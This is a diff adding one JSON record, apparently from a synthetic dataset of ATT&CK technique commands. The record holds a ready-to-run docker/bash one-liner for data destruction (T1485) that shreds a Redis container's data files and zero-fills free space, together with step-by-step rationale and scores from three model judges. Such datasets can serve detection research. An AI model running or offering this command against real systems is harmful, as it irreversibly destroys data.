@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Containers",
+  "shell": "Bash",
+  "command": "docker run --rm --volumes-from redis01 ubuntu bash -lc 'if [ -d /data ]; then find /data -type f -print0 | xargs -0 -r shred -n 2 -z -u; dd if=/dev/zero of=/data/.wipe bs=10M || true; sync; rm -f /data/.wipe; fi'",
+  "explanation": "Targets the Redis data directory exposed by redis01, securely overwriting and deleting data files and then zero-filling free space to remove remnants, followed by sync.",
+  "rationale_steps": [
+    "Reuse redis01's data mount via --volumes-from",
+    "Shred all data files with multiple passes and delete",
+    "Fill remaining free space with zeros to wipe slack space",
+    "Sync and remove filler file"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-763669c5-13f0cb8c",
+  "source_prompt_hash": "763669c5",
+  "timestamp_utc": "2025-09-30T08:01:03.936632Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for all tools used (shred, dd, find, xargs), correct command separators, and proper conditional structure.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by using shred to securely overwrite files with multiple passes (-n 2), zero them out (-z), unlink them (-u), followed by zero-filling free space with dd, and removing all traces with proper synchronization.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:06:16.734407Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, proper command separators, valid flags, and correct bash syntax throughout the docker and internal commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of comprehensive data destruction, using `shred` for existing files and `dd /dev/zero` to fill free space, directly aligning with MITRE ATT&CK T1485 principles and is operationally plausible within a container environment.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:06:25.432080Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed docker run invocation with valid flags and a balanced single-quoted bash -lc script using correct find, xargs, shred, dd, and control-flow syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "It mounts redis01\u2019s volumes, securely overwrites and deletes files under /data with shred, then zero-fills free space and removes the filler file, aligning with data destruction on container volumes.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:06:47.853216Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
